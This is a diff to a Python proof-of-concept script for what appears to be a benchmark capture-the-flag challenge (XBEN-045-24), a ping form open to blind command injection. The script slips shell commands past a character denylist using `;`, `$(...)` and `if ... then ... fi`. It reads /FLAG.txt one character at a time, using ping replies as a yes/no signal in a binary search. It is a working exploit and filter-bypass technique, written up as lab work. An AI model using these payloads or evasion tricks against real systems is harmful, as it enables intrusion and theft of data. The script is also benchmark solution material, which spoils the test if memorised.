@@ -1,8 +1,18 @@
 #!/usr/bin/env python3
-"""XBEN-037-24 — "Is There Anybody Out There? - Blind" (command_injection).
+"""XBEN-045-24 — "Is There Anybody Out There? (with a twist)" (command_injection).
 
-The ping form concatenates its parameter into a shell command and reports only
-whether the host answered. One bit per request, 64 hex characters to recover.
+The same ping form as XBEN-037, with a character filter added: `<`, `>`, `|`
+and `&` are rejected outright. The filter is a denylist and it misses the two
+things this needs, `;` and `$(…)`, so the injection works the same way.
+
+It does not port across *unchanged*, though, and the difference is instructive:
+XBEN-037's payload ends `&& ping …`, and `&` is on the denylist. The same logic
+written as `if …; then ping …; fi` uses no filtered character at all. The filter
+stops one spelling, not the capability.
+
+The oracle is different, though. This app parses the ping output and reports
+"Packets Transmitted: …" on success or "Failed to parse …" otherwise, so the
+success string is what to match rather than "Host is reachable".
 
 Three things this script does that the first attempt got wrong, each of which
 cost a run:
@@ -36,7 +46,7 @@ import subprocess
 import sys
 
 H5I = "target/release/h5i"
-SESSION = "xben037-poc"
+SESSION = "xben045-poc"
 HEX = "0123456789abcdef"
 
 
@@ -59,7 +69,7 @@ def probe(payload, seq):
     # look. Only the first is a yes, and the third must never be read as a no.
     outcome = subprocess.run(
         [H5I, "websec", "match", f"res_{reply['seq']}",
-         "--contains", "Host is reachable", "--session", SESSION],
+         "--contains", "Packets Transmitted", "--session", SESSION],
         capture_output=True, text=True)
     if outcome.returncode not in (0, 1):
         raise RuntimeError(f"the oracle could not be read: {outcome.stderr.strip()}")
@@ -88,9 +98,10 @@ def main():
         lo, hi = 0, 15
         while lo < hi:                      # four questions per character
             mid = (lo + hi) // 2
+            # `&&` would be rejected: `&` is on the denylist. `if` is not.
             payload = (f'; c=$(cut -c{position} /FLAG.txt); '
                        f'n=$(printf "%d" "\'$c"); '
-                       f'[ $n -le {ord(HEX[mid])} ] && ping -c 1 -W 1 127.0.0.1')
+                       f'if [ $n -le {ord(HEX[mid])} ]; then ping -c 1 -W 1 127.0.0.1; fi')
             if probe(payload, seq):
                 hi = mid
             else:
